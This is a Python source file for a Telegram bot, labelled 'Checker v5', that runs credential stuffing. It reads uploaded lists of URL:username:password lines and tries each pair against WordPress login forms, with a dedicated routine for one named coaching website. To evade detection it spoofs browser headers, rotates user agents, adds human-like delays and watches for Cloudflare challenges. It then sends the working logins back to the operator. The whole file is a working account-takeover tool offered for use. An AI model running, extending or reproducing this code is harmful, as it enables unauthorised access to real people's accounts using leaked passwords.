import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
import random
from datetime import datetime
from urllib.parse import urljoin, urlparse

# Fix for Pyrogram
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Configuration ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# --- Flask ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot running", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# --- Clean URL (AGGRESSIVE) ---
def clean_url(url):
    """Fix ALL URL issues"""
    url = url.strip().lower()
    
    # Remove ALL duplicate protocols
    while 'https://https://' in url:
        url = url.replace('https://https://', 'https://')
    while 'http://http://' in url:
        url = url.replace('http://http://', 'http://')
    while 'https://http://' in url:
        url = url.replace('https://http://', 'http://')
    while 'http://https://' in url:
        url = url.replace('http://https://', 'https://')
    
    # Ensure protocol
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # Fix path issues - get base domain for login
    if '/password/edit' in url:
        url = url.split('/password')[0] + '/login'
    if '/sign_up' in url:
        url = url.split('/sign_up')[0] + '/login'
    
    return url

# --- Parse Credentials (FIXED) ---
def parse_credential_line(line):
    """Parse: URL:USERNAME:PASSWORD"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    # Split by colon
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    # URL is first part
    raw_url = parts[0]
    url = clean_url(raw_url)
    
    # Find username and password
    # Format: URL:USERNAME:PASSWORD
    # OR: URL:EMAIL:PASSWORD
    
    # If 3 parts: URL:USER:PASS
    if len(parts) == 3:
        username = parts[1]
        password = parts[2]
    else:
        # More parts - check if email format
        # URL:EMAIL:PASS (email has @)
        if '@' in parts[1]:
            username = parts[1]
            password = ':'.join(parts[2:])  # Rest is password
        else:
            # URL:USER:PASS:EXTRA (ignore extra)
            username = parts[1]
            password = parts[2]
    
    return (url, username, password)

# --- User Agents ---
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
]

# --- Check with Cloudflare bypass attempt ---
async def check_mitesh_khatri(session, email, password):
    """Check with CF bypass"""
    
    login_url = "https://coaching.miteshkhatri.com/login"
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://coaching.miteshkhatri.com',
        'Referer': 'https://coaching.miteshkhatri.com/login',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Cache-Control': 'max-age=0',
    }
    
    payload = {
        'log': email,
        'pwd': password,
        'rememberme': 'forever',
        'wp-submit': 'Log In',
        'redirect_to': 'https://coaching.miteshkhatri.com/wp-admin/',
        'testcookie': '1'
    }
    
    try:
        # Step 1: GET login page to get cookies
        async with session.get(
            login_url, 
            headers=headers, 
            timeout=15, 
            ssl=False
        ) as get_resp:
            
            get_text = await get_resp.text()
            get_status = get_resp.status
            
            # Check if Cloudflare challenge
            if 'cf-browser-verification' in get_text or 'Checking your browser' in get_text:
                return (False, {'error': 'Cloudflare challenge detected - cannot bypass'})
            
            # Extract any hidden fields
            hidden_fields = {}
            input_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
            for match in re.finditer(input_pattern, get_text):
                hidden_fields[match.group(1)] = match.group(2)
            
            # Update payload with hidden fields
            payload.update(hidden_fields)
        
        # Human-like delay
        await asyncio.sleep(random.uniform(1.5, 3))
        
        # Step 2: POST login
        async with session.post(
            login_url,
            data=payload,
            headers=headers,
            allow_redirects=True,
            timeout=20,
            ssl=False
        ) as response:
            
            final_url = str(response.url)
            text = await response.text()
            text_lower = text.lower()
            status = response.status
            
            # Get cookies
            cookie_dict = {}
            for cookie in session.cookie_jar:
                if 'coaching.miteshkhatri.com' in str(cookie.get('domain', '')):
                    cookie_dict[cookie.key] = cookie.value
            
            debug_info = {
                'input_url': email[:5] + '***',
                'status': status,
                'final_url': final_url,
                'cookies': list(cookie_dict.keys()),
                'has_cf_cookie': '__cf_bm' in str(cookie_dict) or 'cf_clearance' in str(cookie_dict),
                'has_wp_cookie': any('wordpress' in k for k in cookie_dict),
            }
            
            # === SUCCESS CHECKS ===
            
            # 1. WordPress logged_in cookie
            if any('wordpress_logged_in' in k for k in cookie_dict):
                return (True, {**debug_info, 'result': 'SUCCESS - WP logged_in cookie'})
            
            # 2. Redirected to admin
            if '/wp-admin' in final_url and 'wp-login' not in final_url:
                return (True, {**debug_info, 'result': 'SUCCESS - Redirected to wp-admin'})
            
            # 3. Dashboard content without error
            success_markers = ['dashboard', 'wp-admin', 'howdy', 'profile']
            error_markers = ['error', 'incorrect', 'invalid', 'failed']
            
            has_success = any(m in text_lower for m in success_markers)
            has_error = any(m in text_lower for m in error_markers)
            
            if has_success and not has_error:
                # Double check - look for logout link
                if 'logout' in text_lower or 'log out' in text_lower:
                    return (True, {**debug_info, 'result': 'SUCCESS - Dashboard with logout'})
            
            # === FAILURE CHECKS ===
            
            failure_patterns = [
                'incorrect password' in text_lower,
                'invalid username' in text_lower,
                'unknown email' in text_lower,
                'login failed' in text_lower,
                'the password you entered' in text_lower,
                'is incorrect' in text_lower,
                'error' in text_lower and 'login' in text_lower,
                'class="shake"' in text_lower,  # WP error animation
                status == 403 and 'wp-login' in final_url,
            ]
            
            if any(failure_patterns):
                return (False, {**debug_info, 'result': 'FAILED - Login error detected'})
            
            # Check if still on login page
            if 'wp-login' in final_url or '/login' in final_url:
                if 'id="loginform"' in text_lower or 'name="loginform"' in text_lower:
                    return (False, {**debug_info, 'result': 'FAILED - Still on login page'})
            
            return (False, {**debug_info, 'result': 'UNCLEAR - Manual check needed', 'snippet': text[:200]})
            
    except Exception as e:
        return (False, {'error': str(e)[:100]})

# --- Generic checker ---
async def check_generic(session, url, username, password):
    """Fallback for other sites"""
    
    endpoints = [
        url,
        url.replace('/login', '/wp-login.php'),
        url.rstrip('/') + '/wp-login.php',
    ]
    
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'rememberme': 'forever',
        'redirect_to': url.replace('/login', '/wp-admin/'),
        'testcookie': '1'
    }
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    for endpoint in endpoints:
        try:
            async with session.post(
                endpoint, data=payload, headers=headers,
                allow_redirects=True, timeout=15, ssl=False
            ) as resp:
                
                cookies = [c.key for c in session.cookie_jar]
                text = await resp.text()
                
                if any('wordpress_logged_in' in c for c in cookies):
                    return (True, {'endpoint': endpoint, 'via': 'generic'})
                
                if 'incorrect' in text.lower() or 'invalid' in text.lower():
                    return (False, {'reason': 'Login error'})
                    
        except Exception:
            continue
    
    return (False, 'All endpoints failed')

# --- Router ---
async def check_credential(session, url, username, password):
    """Route to checker"""
    
    if 'miteshkhatri.com' in url.lower():
        return await check_mitesh_khatri(session, username, password)
    
    return await check_generic(session, url, username, password)

# --- Process ---
async def process_credentials(client, message, file_path):
    
    # Read file
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error: {e}")
        return
    
    # Parse
    credentials = []
    for i, line in enumerate(lines, 1):
        parsed = parse_credential_line(line)
        if parsed:
            credentials.append((i, *parsed))
            logger.info(f"Line {i}: URL={parsed[0][:50]}, User={parsed[1][:20]}")
    
    total = len(credentials)
    if total == 0:
        await message.reply_text("❌ No valid credentials")
        return
    
    await message.reply_text(f"🔍 {total} credentials to check...")
    
    valid = []
    invalid = []
    checked = 0
    
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(timeout=timeout) as session:
        
        for num, url, user, pwd in credentials:
            
            is_valid, debug = await check_credential(session, url, user, pwd)
            
            entry = f"{url}:{user}:{pwd}"
            
            if is_valid:
                valid.append(entry)
                logger.info(f"✅ VALID: {user}")
            else:
                invalid.append(f"{entry} | {json.dumps(debug, default=str)[:100]}")
                logger.info(f"❌ INVALID: {user}")
            
            checked += 1
            
            if checked % 2 == 0 or checked == total:
                await message.reply_text(
                    f"⏳ {checked}/{total} ({int(checked/total*100)}%)\n"
                    f"✅ {len(valid)} valid | ❌ {len(invalid)} invalid"
                )
            
            await asyncio.sleep(random.uniform(2, 4))
    
    # Results
    summary = f"✅ Done!\n\nTotal: {total}\n✅ Valid: {len(valid)}\n❌ Invalid: {len(invalid)}"
    await message.reply_text(summary)
    
    # Files
    if valid:
        fname = f"VALID_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(valid))
        await message.reply_document(fname, caption=f"✅ {len(valid)} Valid")
        os.remove(fname)
    
    if invalid:
        fname = f"DEBUG_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(invalid[:15]))
        await message.reply_document(fname, caption="🐛 Debug (first 15)")
        os.remove(fname)
    
    os.remove(file_path)

# --- Bot ---
app = Client("checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start(client, message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text(
        "👨‍💻 **Checker v5**\n\n"
        "✅ Fixed URL parsing\n"
        "✅ Fixed credential parsing\n"
        "✅ Cloudflare detection\n\n"
        "Format: `URL:username:password`"
    )

@app.on_message(filters.document)
async def doc(client, message):
    if not is_admin(message.from_user.id):
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Send .txt")
        return
    
    try:
        path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Download: {e}")
        return
    
    await message.reply_text("📥 Checking...")
    await process_credentials(client, message, path)

@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
async def other(client, message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text("Send .txt file")

# --- Run ---
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("Bot started")
    app.run()
